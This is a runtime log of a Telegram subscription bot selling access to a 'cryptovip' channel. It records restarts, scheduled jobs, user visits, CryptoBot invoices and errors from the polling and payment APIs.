2026-05-22 14:58:02 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 14:58:02 | INFO     | __main__ | Запуск polling...
2026-05-22 14:58:02 | INFO     | database.db | База данных инициализирована
2026-05-22 14:58:02 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 14:58:02 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 14:58:02 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 14:58:02 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 14:58:03 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:58:03 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 14:58:04 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 14:58:04 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 14:58:04 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 14:58:04 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 14:58:04 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 14:58:05 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 15:00:00 | INFO     | apscheduler.executors.default | Running job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-23 12:00:00 UTC)" (scheduled at 2026-05-22 12:00:00+00:00)
2026-05-22 15:00:00 | INFO     | scheduler.tasks | Запуск отправки напоминаний...
2026-05-22 15:00:00 | INFO     | scheduler.tasks | Напоминания отправлены: 0
2026-05-22 15:00:00 | INFO     | apscheduler.executors.default | Job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-23 12:00:00 UTC)" executed successfully
2026-05-22 15:00:01 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 15:05:27 | INFO     | __main__ | Запуск бота...
2026-05-22 15:05:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 15:05:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 15:05:28 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 15:05:28 | INFO     | __main__ | Запуск polling...
2026-05-22 15:05:28 | INFO     | database.db | База данных инициализирована
2026-05-22 15:05:28 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 15:05:28 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 15:05:28 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 15:05:28 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 15:05:29 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 15:05:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 15:05:29 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 15:05:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 15:05:30 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 15:05:30 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 15:05:30 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 15:05:30 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 15:06:32 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 16:42:10 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramNetworkError: HTTP Client says - Request timeout error
2026-05-22 16:42:10 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-22 16:48:54 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 16:57:03 | INFO     | __main__ | Запуск бота...
2026-05-22 16:57:03 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 16:57:03 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 16:57:03 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 16:57:03 | INFO     | __main__ | Запуск polling...
2026-05-22 16:57:03 | INFO     | database.db | База данных инициализирована
2026-05-22 16:57:03 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 16:57:03 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 16:57:03 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 16:57:03 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 16:57:04 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 16:57:04 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 16:57:05 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 16:57:05 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 16:57:06 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 16:57:06 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 16:57:06 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 16:57:06 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 16:58:05 | INFO     | __main__ | Запуск бота...
2026-05-22 16:58:05 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 16:58:05 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 16:58:05 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 16:58:05 | INFO     | __main__ | Запуск polling...
2026-05-22 16:58:05 | INFO     | database.db | База данных инициализирована
2026-05-22 16:58:05 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 16:58:05 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 16:58:05 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 16:58:05 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 16:58:06 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 16:58:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 16:58:07 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 16:58:07 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 16:58:08 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 16:58:08 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 16:58:08 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 16:58:08 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 16:58:55 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 17:00:37 | INFO     | handlers.start | Новый пользователь 7771875741 (@n_sero)
2026-05-22 17:00:47 | INFO     | handlers.start | Возврат пользователь 7771875741 (@n_sero)
2026-05-22 17:00:52 | INFO     | handlers.start | Возврат пользователь 7771875741 (@n_sero)
2026-05-22 17:00:56 | INFO     | handlers.start | Возврат пользователь 7771875741 (@n_sero)
2026-05-22 17:01:09 | INFO     | handlers.start | Возврат пользователь 7771875741 (@n_sero)
2026-05-22 17:01:27 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52162787
2026-05-22 17:01:27 | INFO     | handlers.payment | Инвойс создан: user=7771875741, system=cryptobot, invoice=52162787
2026-05-22 17:02:42 | INFO     | database.db | Подписка активирована: user_id=7771875741, type=month
2026-05-22 17:02:42 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+2CkrbaHSezZiYzBi
2026-05-22 17:12:45 | INFO     | handlers.start | Новый пользователь 8618921278 (@ComplSus)
2026-05-22 07:35:53 | INFO     | __main__ | Запуск бота...
2026-05-22 07:35:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 07:35:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 07:35:53 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 07:35:53 | INFO     | __main__ | Запуск polling...
2026-05-22 07:35:53 | INFO     | database.db | База данных инициализирована
2026-05-22 07:35:53 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 07:35:53 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 07:35:53 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 07:35:53 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 07:35:53 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 07:35:53 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 07:35:54 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 07:35:54 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 07:35:54 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 07:35:54 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 07:35:54 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 07:35:54 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 07:36:58 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 10:01:49 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 10:03:21 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 12:27:33 | INFO     | __main__ | Запуск бота...
2026-05-22 12:27:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:27:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:27:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:27:34 | INFO     | __main__ | Запуск polling...
2026-05-22 12:27:34 | INFO     | database.db | База данных инициализирована
2026-05-22 12:27:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:27:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:27:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:27:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:27:34 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:27:34 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:27:34 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:27:47 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 12:28:58 | INFO     | __main__ | Запуск бота...
2026-05-22 12:28:59 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:28:59 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:28:59 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:28:59 | INFO     | __main__ | Запуск polling...
2026-05-22 12:28:59 | INFO     | database.db | База данных инициализирована
2026-05-22 12:28:59 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:28:59 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:28:59 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:28:59 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:28:59 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:28:59 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:28:59 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:34:25 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 12:34:29 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 12:48:09 | INFO     | __main__ | Запуск бота...
2026-05-22 12:48:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:48:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:48:09 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:48:09 | INFO     | __main__ | Запуск polling...
2026-05-22 12:48:09 | INFO     | database.db | База данных инициализирована
2026-05-22 12:48:09 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:48:09 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:48:09 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:48:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:48:09 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:48:09 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:48:09 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:48:14 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:48:14 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-22 12:48:19 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:48:19 | WARNING  | aiogram.dispatcher | Sleep for 1.234448 seconds and try again... (tryings = 1, bot id = 8780899509)
2026-05-22 12:48:24 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:48:24 | WARNING  | aiogram.dispatcher | Sleep for 1.834235 seconds and try again... (tryings = 2, bot id = 8780899509)
2026-05-22 12:48:30 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:48:30 | WARNING  | aiogram.dispatcher | Sleep for 2.348223 seconds and try again... (tryings = 3, bot id = 8780899509)
2026-05-22 12:48:37 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:48:37 | WARNING  | aiogram.dispatcher | Sleep for 3.204374 seconds and try again... (tryings = 4, bot id = 8780899509)
2026-05-22 12:54:28 | INFO     | __main__ | Запуск бота...
2026-05-22 12:54:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:54:28 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:54:28 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:54:28 | INFO     | __main__ | Запуск polling...
2026-05-22 12:54:28 | INFO     | database.db | База данных инициализирована
2026-05-22 12:54:28 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:54:28 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:54:28 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:54:28 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:54:29 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:54:29 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:54:29 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:54:33 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:54:33 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-22 12:54:38 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:54:38 | WARNING  | aiogram.dispatcher | Sleep for 1.239773 seconds and try again... (tryings = 1, bot id = 8780899509)
2026-05-22 12:54:44 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:54:44 | WARNING  | aiogram.dispatcher | Sleep for 1.679745 seconds and try again... (tryings = 2, bot id = 8780899509)
2026-05-22 12:54:50 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:54:50 | WARNING  | aiogram.dispatcher | Sleep for 2.301508 seconds and try again... (tryings = 3, bot id = 8780899509)
2026-05-22 12:54:56 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramConflictError: Telegram server says - Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
2026-05-22 12:54:56 | WARNING  | aiogram.dispatcher | Sleep for 2.785345 seconds and try again... (tryings = 4, bot id = 8780899509)
2026-05-22 12:55:24 | INFO     | __main__ | Запуск бота...
2026-05-22 12:55:24 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:55:24 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:55:24 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:55:24 | INFO     | __main__ | Запуск polling...
2026-05-22 12:55:24 | INFO     | database.db | База данных инициализирована
2026-05-22 12:55:24 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:55:24 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:55:24 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:55:24 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:55:24 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:55:24 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:55:24 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:55:24 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:55:25 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:55:25 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:55:25 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:55:25 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:55:35 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 12:59:35 | INFO     | __main__ | Запуск бота...
2026-05-22 12:59:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:59:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-22 12:59:35 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-22 12:59:35 | INFO     | __main__ | Запуск polling...
2026-05-22 12:59:35 | INFO     | database.db | База данных инициализирована
2026-05-22 12:59:35 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-22 12:59:35 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-22 12:59:35 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-22 12:59:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAOQahBE...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAMDahAC...
2026-05-22 12:59:36 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-22 12:59:36 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-22 12:59:36 | INFO     | __main__ | Бот запущен: @yastudiooo_bot (id=8780899509)
2026-05-22 12:59:55 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-22 13:00:46 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-22 18:11:15 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramRetryAfter: Telegram server says - Flood control exceeded on method 'GetUpdates'. Retry in 5 seconds.
Original description: Too Many Requests: retry after 5
(background on this error at: https://core.telegram.org/bots/faq#my-bot-is-hitting-limits-how-do-i-avoid-this)
2026-05-22 18:11:15 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 8780899509)
2026-05-22 18:11:16 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramRetryAfter: Telegram server says - Flood control exceeded on method 'GetUpdates'. Retry in 5 seconds.
Original description: Too Many Requests: retry after 5
(background on this error at: https://core.telegram.org/bots/faq#my-bot-is-hitting-limits-how-do-i-avoid-this)
2026-05-22 18:11:16 | WARNING  | aiogram.dispatcher | Sleep for 1.337105 seconds and try again... (tryings = 1, bot id = 8780899509)
2026-05-22 18:11:20 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramServerError: Telegram server says - Bad Gateway
2026-05-22 18:11:20 | WARNING  | aiogram.dispatcher | Sleep for 1.572768 seconds and try again... (tryings = 2, bot id = 8780899509)
2026-05-23 00:59:35 | INFO     | apscheduler.executors.default | Running job "check_expired_subscriptions (trigger: interval[12:00:00], next run at: 2026-05-23 19:59:35 UTC)" (scheduled at 2026-05-23 07:59:35.810280+00:00)
2026-05-23 00:59:35 | INFO     | scheduler.tasks | Запуск проверки истёкших подписок...
2026-05-23 00:59:35 | INFO     | scheduler.tasks | Истёкших подписок нет
2026-05-23 00:59:35 | INFO     | apscheduler.executors.default | Job "check_expired_subscriptions (trigger: interval[12:00:00], next run at: 2026-05-23 19:59:35 UTC)" executed successfully
2026-05-23 05:00:00 | INFO     | apscheduler.executors.default | Running job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-24 12:00:00 UTC)" (scheduled at 2026-05-23 12:00:00+00:00)
2026-05-23 05:00:00 | INFO     | scheduler.tasks | Запуск отправки напоминаний...
2026-05-23 05:00:00 | INFO     | scheduler.tasks | Напоминания отправлены: 0
2026-05-23 05:00:00 | INFO     | apscheduler.executors.default | Job "send_subscription_reminders (trigger: cron[hour='12', minute='0'], next run at: 2026-05-24 12:00:00 UTC)" executed successfully
2026-05-23 08:12:33 | INFO     | handlers.start | Новый пользователь 767917200 (@mega_profille)
2026-05-23 08:13:37 | INFO     | utils.currency | Курс USD/RUB обновлён: 71.246783
2026-05-23 08:13:37 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:13:46 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:13:49 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52246734
2026-05-23 08:13:49 | INFO     | handlers.payment | Инвойс создан: user=767917200, system=cryptobot, invoice=52246734
2026-05-23 08:15:08 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:15:12 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52246809
2026-05-23 08:15:12 | INFO     | handlers.payment | Инвойс создан: user=767917200, system=cryptobot, invoice=52246809
2026-05-23 08:20:09 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-23 08:20:24 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52247149
2026-05-23 08:20:24 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=52247149
2026-05-23 08:20:29 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-23 08:27:03 | INFO     | __main__ | Запуск бота...
2026-05-23 08:27:03 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 08:27:03 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-23 08:27:03 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-23 08:27:03 | INFO     | __main__ | Запуск polling и webhook-сервера...
2026-05-23 08:27:03 | INFO     | __main__ | Tribute webhook сервер запущен на порту 8080
2026-05-23 08:27:03 | INFO     | database.db | База данных инициализирована
2026-05-23 08:27:03 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-23 08:27:03 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-23 08:27:03 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-23 08:27:03 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-23 08:27:04 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAICBGoR...
